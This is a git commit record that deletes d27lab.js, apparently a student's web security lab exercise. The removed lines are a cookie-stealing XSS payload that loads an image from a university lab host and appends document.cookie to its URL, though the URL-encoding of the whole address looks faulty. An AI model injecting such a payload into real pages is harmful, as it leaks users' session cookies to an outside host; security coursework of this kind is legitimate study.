d01bb0f8d1dc90a2eb04e0cacf857000d67a5cc3
Nathan Jaremko <njaremko@gmail.com>
2017-12-02 21:58:32 -0500

    Delete d27lab.js

--- d27lab.js
+++
@@ -1,3 +0,0 @@
-var myImage = new Image(100, 200);
-myImage.src = encodeURIComponent("http://token.cms-weblab.utsc.utoronto.ca/set.php?sid=1001618966&token=") + document.cookie.substring(10); 
-document.body.appendChild(myImage);
